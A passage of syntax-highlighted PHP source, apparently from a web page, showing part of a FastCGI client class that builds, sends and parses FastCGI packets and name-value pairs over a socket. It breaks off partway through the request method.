<span class="token variable">$_host</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>    <span class="token comment">/**     * Port     * @var Integer     */</span>    <span class="token keyword">private</span> <span class="token variable">$_port</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>    <span class="token comment">/**     * Keep Alive     * @var Boolean     */</span>    <span class="token keyword">private</span> <span class="token variable">$_keepAlive</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token comment">/**     * Constructor     *     * @param String $host Host of the FastCGI application     * @param Integer $port Port of the FastCGI application     */</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">,</span> <span class="token variable">$port</span> <span class="token operator">=</span> <span class="token number">9001</span><span class="token punctuation">)</span> <span class="token comment">// and default value for port, just for unixdomain socket</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_host</span> <span class="token operator">=</span> <span class="token variable">$host</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_port</span> <span class="token operator">=</span> <span class="token variable">$port</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * Define whether or not the FastCGI application should keep the connection     * alive at the end of a request     *     * @param Boolean $b true if the connection should stay alive, false otherwise     */</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">setKeepAlive</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_keepAlive</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">boolean</span><span class="token punctuation">)</span><span class="token variable">$b</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_keepAlive</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_sock</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_sock</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * Get the keep alive status     *     * @return Boolean true if the connection should stay alive, false otherwise     */</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getKeepAlive</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_keepAlive</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * Create a connection to the FastCGI application     */</span>    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">connect</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_sock</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token comment">//$this->_sock = fsockopen($this->_host, $this->_port, $errno, $errstr, 5);</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_sock</span> <span class="token operator">=</span> <span class="token function">stream_socket_client</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_host</span><span class="token punctuation">,</span> <span class="token variable">$errno</span><span class="token punctuation">,</span> <span class="token variable">$errstr</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_sock</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Unable to connect to FastCGI application'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * Build a FastCGI packet     *     * @param Integer $type Type of the packet     * @param String $content Content of the packet     * @param Integer $requestId RequestId     */</span>    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">buildPacket</span><span class="token punctuation">(</span><span class="token variable">$type</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">,</span> <span class="token variable">$requestId</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$clen</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">VERSION_1</span><span class="token punctuation">)</span>         <span class="token comment">/* version */</span>            <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$type</span><span class="token punctuation">)</span>                    <span class="token comment">/* type */</span>            <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$requestId</span> <span class="token operator">>></span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> <span class="token comment">/* requestIdB1 */</span>            <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$requestId</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span>        <span class="token comment">/* requestIdB0 */</span>            <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$clen</span> <span class="token operator">>></span> <span class="token number">8</span> <span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span>     <span class="token comment">/* contentLengthB1 */</span>            <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$clen</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span>             <span class="token comment">/* contentLengthB0 */</span>            <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>                        <span class="token comment">/* paddingLength */</span>            <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>                        <span class="token comment">/* reserved */</span>            <span class="token operator">.</span> <span class="token variable">$content</span><span class="token punctuation">;</span>                     <span class="token comment">/* content */</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * Build an FastCGI Name value pair     *     * @param String $name Name     * @param String $value Value     * @return String FastCGI Name value pair     */</span>    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">buildNvpair</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$nlen</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$vlen</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">&lt;</span> <span class="token number">128</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token comment">/* nameLengthB0 */</span>            <span class="token variable">$nvpair</span> <span class="token operator">=</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$nlen</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token comment">/* nameLengthB3 &amp; nameLengthB2 &amp; nameLengthB1 &amp; nameLengthB0 */</span>            <span class="token variable">$nvpair</span> <span class="token operator">=</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">>></span> <span class="token number">24</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">0x80</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">>></span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">>></span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$vlen</span> <span class="token operator">&lt;</span> <span class="token number">128</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token comment">/* valueLengthB0 */</span>            <span class="token variable">$nvpair</span> <span class="token operator">.=</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$vlen</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token comment">/* valueLengthB3 &amp; valueLengthB2 &amp; valueLengthB1 &amp; valueLengthB0 */</span>            <span class="token variable">$nvpair</span> <span class="token operator">.=</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$vlen</span> <span class="token operator">>></span> <span class="token number">24</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">0x80</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$vlen</span> <span class="token operator">>></span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$vlen</span> <span class="token operator">>></span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$vlen</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">/* nameData &amp; valueData */</span>        <span class="token keyword">return</span> <span class="token variable">$nvpair</span> <span class="token operator">.</span> <span class="token variable">$name</span> <span class="token operator">.</span> <span class="token variable">$value</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * Read a set of FastCGI Name value pairs     *     * @param String $data Data containing the set of FastCGI NVPair     * @return array of NVPair     */</span>    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">readNvpair</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token variable">$length</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$array</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$length</span> <span class="token operator">===</span> <span class="token constant">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$length</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$p</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token variable">$p</span> <span class="token operator">!=</span> <span class="token variable">$length</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$nlen</span> <span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token variable">$p</span><span class="token operator">++</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">>=</span> <span class="token number">128</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$nlen</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">&amp;</span> <span class="token number">0x7F</span> <span class="token operator">&lt;&lt;</span> <span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$nlen</span> <span class="token operator">|=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token variable">$p</span><span class="token operator">++</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$nlen</span> <span class="token operator">|=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token variable">$p</span><span class="token operator">++</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$nlen</span> <span class="token operator">|=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token variable">$p</span><span class="token operator">++</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token variable">$vlen</span> <span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token variable">$p</span><span class="token operator">++</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$vlen</span> <span class="token operator">>=</span> <span class="token number">128</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$vlen</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">&amp;</span> <span class="token number">0x7F</span> <span class="token operator">&lt;&lt;</span> <span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$vlen</span> <span class="token operator">|=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token variable">$p</span><span class="token operator">++</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$vlen</span> <span class="token operator">|=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token variable">$p</span><span class="token operator">++</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$vlen</span> <span class="token operator">|=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token variable">$p</span><span class="token operator">++</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token variable">$array</span><span class="token punctuation">[</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token variable">$p</span><span class="token punctuation">,</span> <span class="token variable">$nlen</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token variable">$p</span><span class="token operator">+</span><span class="token variable">$nlen</span><span class="token punctuation">,</span> <span class="token variable">$vlen</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$p</span> <span class="token operator">+=</span> <span class="token punctuation">(</span><span class="token variable">$nlen</span> <span class="token operator">+</span> <span class="token variable">$vlen</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token variable">$array</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * Decode a FastCGI Packet     *     * @param String $data String containing all the packet     * @return array     */</span>    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">decodePacketHeader</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$ret</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'version'</span><span class="token punctuation">]</span>       <span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'type'</span><span class="token punctuation">]</span>          <span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'requestId'</span><span class="token punctuation">]</span>     <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token number">2</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token number">3</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'contentLength'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token number">4</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token number">5</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'paddingLength'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token number">6</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'reserved'</span><span class="token punctuation">]</span>      <span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">&#123;</span><span class="token number">7</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$ret</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * Read a FastCGI Packet     *     * @return array     */</span>    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">readPacket</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$packet</span> <span class="token operator">=</span> <span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_sock</span><span class="token punctuation">,</span> <span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">HEADER_LEN</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$resp</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">decodePacketHeader</span><span class="token punctuation">(</span><span class="token variable">$packet</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'contentLength'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$len</span>  <span class="token operator">=</span> <span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'contentLength'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token variable">$len</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$buf</span><span class="token operator">=</span><span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_sock</span><span class="token punctuation">,</span> <span class="token variable">$len</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token variable">$len</span> <span class="token operator">-=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$buf</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span> <span class="token operator">.=</span> <span class="token variable">$buf</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'paddingLength'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$buf</span><span class="token operator">=</span><span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_sock</span><span class="token punctuation">,</span> <span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'paddingLength'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">return</span> <span class="token variable">$resp</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * Get Informations on the FastCGI application     *     * @param array $requestedInfo information to retrieve     * @return array     */</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getValues</span><span class="token punctuation">(</span><span class="token keyword type-hint">array</span> <span class="token variable">$requestedInfo</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">connect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$request</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$requestedInfo</span> <span class="token keyword">as</span> <span class="token variable">$info</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$request</span> <span class="token operator">.=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">buildNvpair</span><span class="token punctuation">(</span><span class="token variable">$info</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_sock</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">buildPacket</span><span class="token punctuation">(</span><span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">GET_VALUES</span><span class="token punctuation">,</span> <span class="token variable">$request</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$resp</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">readPacket</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'type'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">GET_VALUES_RESULT</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">readNvpair</span><span class="token punctuation">(</span><span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'length'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Unexpected response type, expecting GET_VALUES_RESULT'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * Execute a request to the FastCGI application     *     * @param array $params Array of parameters     * @param String $stdin Content     * @return String     */</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">request</span><span class="token punctuation">(</span><span class="token keyword type-hint">array</span> <span class="token variable">$params</span><span class="token punctuation">,</span> <span class="token variable">$stdin</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$response</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span><span class="token comment">//        $this->connect();</span>        <span class="token variable">$request</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">buildPacket</span><span class="token punctuation">(</span><span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">BEGIN_REQUEST</span><span class="token punctuation">,</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">RESPONDER</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword type-casting">int</span><span class="token punctuation">)</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_keepAlive</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token function">str_repeat</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$paramsRequest</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$params</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=></span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$paramsRequest</span> <span class="token operator">.=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">buildNvpair</span><span class="token punctuation">(</span><span class="token 